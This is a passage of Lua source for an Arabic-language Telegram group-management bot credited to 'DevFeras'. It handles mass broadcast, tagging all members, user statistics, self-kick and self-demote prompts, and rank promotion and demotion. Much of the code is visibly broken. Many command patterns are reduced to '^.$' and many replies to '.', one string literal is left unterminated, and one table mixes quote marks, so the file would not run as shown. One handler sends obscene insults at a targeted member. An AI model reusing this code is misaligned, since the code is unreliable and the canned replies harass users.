end end end
--     Source DevFeras     --
if Sudo(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function Feras_dev(extra,result,success)
local listgp = DevFeras:smembers(DevFeras.."bot:groups")
for k,v in pairs(listgp) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local listpv = DevFeras:smembers(DevFeras.."bot:userss")
for k,v in pairs(listpv) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local gps = DevFeras:scard(DevFeras..'bot:groups') or 0
local pvs = DevFeras:scard(DevFeras..'bot:userss') or 0
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ '..gps..' ❩ مجموعه \n⌁︙والى ↫ ❨ '..pvs..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),Feras_dev)
end
end
--     Source DevFeras     --
if text:match("^مشاهده المنشور$") and ChCheck(msg) or text:match("^مشاهدات المنشور$") and ChCheck(msg) or text:match("^عدد المشاهدات$") and ChCheck(msg) then
DevFeras:set(DevFeras..'bot:viewget'..msg.sender_user_id_,true)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source DevFeras     --
if text:match("^السورس$") or text:match("^سورس$") then 
local text =  [[
Welcome To Source
⌁︙DevFeras
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)

⌁︙[Exp Source](https://t.me/DevFeras)

⌁︙[Developer](https://t.me/DevFeras)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Tws DevFeras](https://t.me/im9q2h_bot)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source DevFeras     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevFeras:get(DevFeras.."abs:Kick:Me"..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevFeras:set(DevFeras..'yes'..msg.sender_user_id_..'', 'delyes')
DevFeras:set(DevFeras..'no'..msg.sender_user_id_..'', 'delno')
local Text = '⌁︙هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source DevFeras     --
if text == 'تعطيل اطردني' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevFeras:set(DevFeras.."abs:Kick:Me"..msg.chat_id_, true)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevFeras:del(DevFeras.."abs:Kick:Me"..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
--     Source DevFeras     --
if text == "نزلني" and ChCheck(msg) then
if DevFeras:get(DevFeras.."abs:Del:Me"..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevFeras:set(DevFeras..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevFeras:set(DevFeras..'nodel'..msg.sender_user_id_..'', 'delno')
local Text = '⌁︙هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source DevFeras     --
if text == 'تعطيل نزلني' and Monsh(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevFeras:set(DevFeras.."abs:Del:Me"..msg.chat_id_, true)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and Monsh(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevFeras:del(DevFeras.."abs:Del:Me"..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تاك للكل" and ChCheck(msg) then
function TagAll(dp1,dp2)
local text = "⌁︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevFeras:get(DevFeras..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..DevFeras:get(DevFeras..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
--     Source DevFeras     --
if text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
function TagAll(dp1,dp2)
local text = "⌁︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevFeras:get(DevFeras..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..DevFeras:get(DevFeras..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source DevFeras     --
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
--     Source DevFeras     --
if text:match("^معرفي$") and ChCheck(msg) then
function get_username(extra,result,success)
text = '⌁︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     Source DevFeras     --
if text:match("^اسمي$") and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '⌁︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source DevFeras     --
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙@nnbbot', 1, 'md') end
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then local inline = {{{text="اضغط هنا",url="https://telegram.org/deactivate"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على الرابط',nil,inline) return false end
if text:match("^بوت الحذف$") or text:match("^اريد بوت الحذف$") or text:match("^اريد بوت حذف$") or text:match("^بوت حذف$") or text:match("^بوت حذف حسابات$") or text:match("^راح احذف$") then local inline = {{{text="اضغط هنا",url="https://telegram.org/deactivate"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على البوت',nil,inline) return false end
if text:match("^جهاتي$") and ChCheck(msg) or text:match("^اضافاتي$") and ChCheck(msg) then add = (tonumber(DevFeras:get(DevFeras..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text:match("^تعديلاتي$") or text:match("^سحكاتي$") and ChCheck(msg) then local edit_msg = DevFeras:get(DevFeras..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text:match("^ايديي$") and ChCheck(msg) then Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text:match("^رتبتي$") and ChCheck(msg) then Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙رتبتك ↫ '..id_rank(msg), 1, 'html') end
if text:match("^ايدي المجموعه$") and ChCheck(msg) then Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevFeras:del(DevFeras..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
--     Source DevFeras     --
if text == "المطور" then 
local DevCh1 = DevFeras:get(DevFeras.."DevFeras3")
local DevText = DevFeras:get(DevFeras.."DevText")
if DevCh1 then DevCh = '\n⌁︙*Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if DevText then
Dev_Feras(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ ['..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
end
end,nil)
end 
--     Source DevFeras     --
if text and text:match('^هنا @(.*)') and ChCheck(msg) or text and text:match('^هنا @(.*)') and ChCheck(msg) then 
local username = text:match('^هنا @(.*)') or text:match('^هنا @(.*)') 
function Feras_dev(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, 'قول مياو', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, 'شرايك تقول مياو', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1419573259) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, 'قووول مايووو ', 1, 'md') 
return false  
end  
if DevFeras:sismember(DevFeras.."abs:absmonsh:"..msg.chat_id_,result.id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, 'تعبت وانا اقولك', 1, 'md')
return false
end 
local Feras_dev = "." 
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md') 
local Feras_dev = { ". @"..username..".",".@"..username..".",". @"..username.."  .",".@"..username..".",".@"..username..".",}
Dev_Feras(msg.chat_id_, result.id_, 1,''..Feras_dev[math.random(#Feras_dev)]..'', 1, 'html') 
else  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,Feras_dev)
end
--     Source DevFeras     --
if text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^هينهه$") or text:match("^.$") or text:match("^.$") or text:match("^.$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '.', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '.', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1419573259) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '.', 1, 'md')
return false
end 
if DevFeras:sismember(DevFeras.."abs:absmonsh:"..msg.chat_id_,result.sender_user_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, 'طاط', 1, 'md')
return false
end 
local Feras_dev = "طاططط 
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md') 
local Feras_dev = {"ساي طاط","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Feras(msg.chat_id_, result.id_, 1,''..Feras_dev[math.random(#Feras_dev)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '.', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Feras(msg.chat_id_, result.id_, 1, '.', 1, 'html')
return false
end 
local Feras_dev = ".️" 
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md') 
local Feras_dev = {"."} 
Dev_Feras(msg.chat_id_, result.id_, 1,''..Feras_dev[math.random(#Feras_dev)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
if text:match("^.$") or text:match("^.$") or text:match("^.$") or text:match("^.$") then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '.', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Feras(msg.chat_id_, result.id_, 1, '', 1, 'html')
return false
end 
local Feras_dev = "." 
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md') 
local Feras_dev = {".",".",'️.","."} 
Dev_Feras(msg.chat_id_, result.id_, 1,''..Feras_dev[math.random(#Feras_dev)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
--     Source DevFeras     --
if text and text:match('^. @(.*)') and ChCheck(msg) or text and text:match('^. @(.*)') and ChCheck(msg) then 
local username = text:match('^. @(.*)') or text:match('^.@(.*)') 
function Feras_dev(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '.', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '. @'..username, 1, 'html') 
return false  
end  
local Feras_dev = "." 
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md') 
local Feras_dev = { ". @"..username..".",".@"..username..".",". @"..username.." .",". @"..username.." .",}
Dev_Feras(msg.chat_id_, result.id_, 1,''..Feras_dev[math.random(#Feras_dev)]..'', 1, 'html') 
else  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,Feras_dev)
end
end
--     Source DevFeras     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevFeras:sismember(DevFeras..'abs:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevFeras:sismember(DevFeras..'abs:ownerall:',result.sender_user_id_) then
ownerall = 'المدراء العامين • ' else ownerall = '' end
if DevFeras:sismember(DevFeras..'abs:adminall:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevFeras:sismember(DevFeras..'abs:vipall:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevFeras:sismember(DevFeras..'abs:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'المنشئين الاساسيين • ' else monsh = '' end
if DevFeras:sismember(DevFeras..'abs:monshid:'..msg.chat_id_, result.sender_user_id_) then
monshid = 'المنشئين • ' else monshid = '' end 
if DevFeras:sismember(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'المدراء • ' else owner = '' end
if DevFeras:sismember(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevFeras:sismember(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevFeras:sismember(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if absmasco(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من ↫ ⤈\n~ ( "..sudobot..''..ownerall..''..adminall..''..vpall..''..monsh..''..monshid..''..owner..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙لم تتم ترقيته مسبقا")  
end
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevFeras:srem(DevFeras..'abs:SudoBot:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:ownerall:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:adminall:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipall:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevFeras:srem(DevFeras..'abs:ownerall:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:adminall:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipall:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'absmonsh' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monshid' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevFeras:sismember(DevFeras..'abs:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevFeras:sismember(DevFeras..'abs:ownerall:',result.id_) then
ownerall = 'المدراء العامين • ' else ownerall = '' end
if DevFeras:sismember(DevFeras..'abs:adminall:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevFeras:sismember(DevFeras..'abs:vipall:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevFeras:sismember(DevFeras..'abs:monsh:'..msg.chat_id_, result.id_) then
monsh = 'المنشئين الاساسيين • ' else monsh = '' end
if DevFeras:sismember(DevFeras..'abs:monshid:'..msg.chat_id_, result.id_) then
monshid = 'المنشئين • ' else monshid = '' end 
if DevFeras:sismember(DevFeras..'abs:owners:'..msg.chat_id_, result.id_) then
owner = 'المدراء • ' else owner = '' end
if DevFeras:sismember(DevFeras..'abs:admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevFeras:sismember(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevFeras:sismember(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if absmasco(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من ↫ ⤈\n~ ( "..sudobot..''..ownerall..''..adminall..''..vpall..''..monsh..''..monshid..''..owner..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"reply","⌁︙لم تتم ترقيته مسبقا")  
end 
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevFeras:srem(DevFeras..'abs:SudoBot:', result.id_)
DevFeras:srem(DevFeras..'abs:ownerall:', result.id_)
DevFeras:srem(DevFeras..'abs:adminall:', result.id_)
DevFeras:srem(DevFeras..'abs:vipall:', result.id_)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevFeras:srem(DevFeras..'abs:ownerall:', result.id_)
DevFeras:srem(DevFeras..'abs:adminall:', result.id_)
DevFeras:srem(DevFeras..'abs:vipall:', result.id_)
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'absmonsh' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.id_)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monshid' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
end
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source DevFeras     --
--       Set SudoBot        --
if Sudo(msg) then
if text ==('رفع مطور') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المطورين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور (%d+)') and SourceCh(msg) then
local user = text:match('رفع مطور (%d+)')
DevFeras:sadd(DevFeras..'abs:SudoBot:',user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المطورين")  
end
--     Source DevFeras     --
--       Rem SudoBot        --
if text ==('تنزيل مطور') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:SudoBot:',result.sender_user_id_)
